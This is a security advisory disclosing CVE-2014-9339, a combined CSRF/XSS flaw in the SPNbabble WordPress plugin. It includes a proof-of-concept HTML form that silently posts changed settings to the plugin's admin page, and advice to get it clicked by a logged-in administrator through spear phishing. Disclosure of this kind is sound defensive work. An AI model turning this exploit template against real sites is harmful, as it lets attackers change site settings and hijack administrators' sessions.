# Title: CSRF/XSS Vulnerability in SPNbabble WP Plugin 
# Author: Manideep K	
# CVE-ID:  CVE-2014-9339
# Plugin Homepage: https://wordpress.org/plugins/spnbabble/
# Version Affected: 1.4.1 (probably lower versions)
# Severity: High 

# About Plugin:
SPNbabble (http://spnbabble.sitepronews.com) allows users to create an account and post 140 character blogs with urls to send out messages to your followers. Through the professional setup of SPNbabble you can also auto connect to Twitter, Friendfeed, Plurk, Tumblr, Facebook, Zannel, Youare, Meemi & Utterli. This plugin once installed allows you to enter your SPNbabble user and password and you can choose which blog posts will be converted into mini blogs. Your blog turned into several mini blogs on the most popular social media platforms is a great way to keep your message strong.

# Description: 
# Vulnerable Parameter: username, password etc
# About Vulnerability: This plugin is vulnerable to a combination of CSRF/XSS attack meaning that if an admin user can be tricked to visit a crafted URL created by attacker (via spear phishing/social engineering), the attacker can insert arbitrary script into admin page. Once exploited, admin’s browser can be made to do almost anything the admin user could typically do by hijacking admin's cookies etc. 
# Vulnerability Class:   	
https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29	        
Cross Site Scripting (https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)) 

# Steps to Reproduce: (POC):
After installing the plugin
You can use the following exploit code to exploit the vulnerability. For testing - you can just save it as .html and then get it clicked with an logged in administrator (by social engineering/spear phishing techniques) and see exploit in action
Almost majority of the fields are vulnerable to CSRF + XSS attack
<html>
  <body>
    <form action="http://localhost/wordpress/wp-admin/options-general.php?page=spnbabble.php" method="POST">
      <input type="hidden" name="username" value="csrf testing" />
      <input type="hidden" name="password" value="" />
      <input type="hidden" name="blogname" value="" />
      <input type="hidden" name="postprefix" value="New&#32;Blog&#32;Post&#58;" />
      <input type="hidden" name="spn&#95;enable" value="Yes" />
      <input type="hidden" name="spn&#95;update" value="Yes" />
      <input type="hidden" name="info&#95;update" value="Update&#32;Options" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

# Recommendations:
a) Use proper input filtering techniques
b) Use unique tokens such as nonces
 
# Mitigation: 
Plugin Closed

# Credits:
Manideep K
Information Security Researcher
https://in.linkedin.com/in/manideepk

